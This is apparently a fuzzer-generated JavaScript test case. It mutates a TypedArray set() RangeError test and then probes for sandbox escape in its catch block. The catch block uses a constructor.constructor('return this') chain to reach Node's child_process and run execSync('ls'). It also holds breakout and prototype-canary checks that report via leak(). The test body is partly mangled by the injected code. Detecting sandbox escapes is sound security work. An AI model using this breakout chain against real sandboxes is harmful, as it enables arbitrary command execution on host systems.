try {
    testWithTypedArrayConstructors(function (TA) {
        let REPLACER = 23;
        var sample, src;
        sample = new TA(2);
        src = new TA(2);
        assert.throws(RangeError, function () {
            throw () => {
                return () => {
                };
            };
            sample.set(src, 1);
        }, '2 + 1 > 2');
        sample = new TA(1);
        src = new TA(2);
        assert.throws(RangeError, function () {
            sample.set(src, 0);
        }, '2 + 0 > 1');
        sample = new TA(1);
        src = new TA(0);
        assert.throws(RangeError, function () {
            sample.set(src, 2);
        }, '0 + 2 > 1');
        sample = new TA(2);
        src = new TA(2);
        assert.throws(RangeError, function () {
            sample.set(src, Infinity);
        }, '2 + Infinity > 2');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}